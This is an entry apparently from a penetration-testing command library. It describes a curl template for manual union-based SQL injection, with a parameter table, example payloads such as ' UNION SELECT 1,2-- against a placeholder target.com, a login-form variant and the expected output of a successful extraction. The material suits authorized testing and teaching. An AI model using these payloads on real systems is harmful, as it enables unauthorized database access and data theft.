---
type: command
executor: bash
data: curl -X GET "$_TARGET_URL?id=$_PAYLOAD" -v
output: null
created_at: '2023-04-06T03:56:36.798488+00:00'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Linux
  - macOS
  - Windows
tags:
  - sql-injection
  - web-exploit
verified: true
validated: true
---

# curl-manual-union-injection

## Command

```bash
curl -X GET "$_TARGET_URL?id=$_PAYLOAD" -v
```

## Description

This command performs a manual SQL injection test using curl to send HTTP requests with injected payloads to a vulnerable web parameter. It is used to deliver union-based SQL payloads, observe responses, and confirm data extraction in scenarios where automated tools are unavailable or blocked.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_TARGET_URL | Full URL of the vulnerable endpoint (e.g., http://target.com/search) | Yes |
| $_PAYLOAD | The SQL injection payload, such as ' UNION SELECT 1,2,3-- or obfuscated variant | Yes |
| -X GET | Specifies HTTP GET method (use POST for form-based) | No |
| -v | Verbose output to show headers and response details | Yes |

## Examples

### Basic Usage

```bash
curl -X GET "http://target.com/search?q=1' UNION SELECT 1,2--" -v
```

### Advanced Usage

```bash
curl -X POST "http://target.com/login" -d "user=$_PAYLOAD&pass=pass" -v
```

## Expected Output

Successful injection shows the legitimate page with injected data appended, e.g.:

HTTP/1.1 200 OK
...

Search Results:
1 | 2 | table_name

No SQL errors; data from system tables appears in the response body. Errors like "syntax error" indicate failed injection.

## Related

- [[procedures/Union-Based-SQL-Injection-with-DBMS-Obfuscation]]
- [[tools/sqlmap]]
